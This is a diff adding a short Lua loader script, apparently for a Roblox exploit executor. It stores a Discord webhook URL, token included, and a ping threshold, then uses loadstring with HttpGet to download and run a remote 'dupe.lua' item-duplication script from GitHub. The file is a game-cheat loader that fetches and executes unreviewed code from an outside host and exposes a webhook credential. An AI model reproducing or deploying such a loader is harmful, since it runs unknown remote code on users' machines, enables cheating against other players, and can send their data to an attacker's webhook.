@@ -1,0 +1,20 @@
+local Webhook = "https://discord.com/api/webhooks/1435659283550310400/FjbgaSdJxy50XlueYDYCrXzIWZONsuyV5siiv4ReVoL_19wQqNC4vsah3dMDnJwJxDKj"
+
+local CustomPingValue = "50m" -- Default: "50m".
+
+
+-- =================================================================================
+--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
+-- =================================================================================
+
+if Webhook and Webhook:match("discord.com/api/webhooks") then
+    getgenv().UserWebhookURL = Webhook
+else
+    return -- Silently stop if webhook is invalid
+end
+
+local multipliers = {k = 1e3, m = 1e6, b = 1e9}
+local num, suffix = type(CustomPingValue) == "string" and CustomPingValue:lower():match("([%d.]+)([kmb])$") or nil
+getgenv().UserPingThreshold = (num and tonumber(num) * multipliers[suffix]) or tonumber(CustomPingValue) or 50e6
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
